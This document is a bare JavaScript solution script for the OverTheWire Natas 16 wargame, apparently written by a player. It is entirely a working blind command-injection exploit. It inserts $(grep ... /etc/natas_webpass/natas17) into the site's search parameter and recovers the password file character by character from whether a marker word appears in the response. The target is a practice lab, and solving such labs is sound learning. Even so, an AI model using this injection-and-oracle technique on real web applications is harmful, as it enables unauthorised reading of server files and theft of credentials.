//$(grep -E [a-zA-Z0-9]{32} /etc/natas_webpass/natas17)elephant

//JS URL encode function
//https://www.w3schools.com/jsref/jsref_encodeuri.asp

charset = "0123456789" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz";
pass_len = 32; //Password length
falsestring = "elephant";
passwd = "";

xhr = new XMLHttpRequest();

while (passwd.length < pass_len) {
	
	for (i=0;i<charset.length;i++) {
	
		url = `http://natas16.natas.labs.overthewire.org/?needle=$(grep -E ${passwd+charset[i]}[a-zA-Z0-9]{${pass_len-passwd.length-1}} /etc/natas_webpass/natas17)elephant&submit=Search`;
		xhr.open('GET',encodeURI(url),false);
		xhr.onload = function () {
			if (!xhr.responseText.includes(falsestring)) {
				console.log(`Password character found: ${charset[i]}`);
				passwd += charset[i];
			}
		};
		xhr.send();
	}
}
console.log(`Password is ${passwd}`);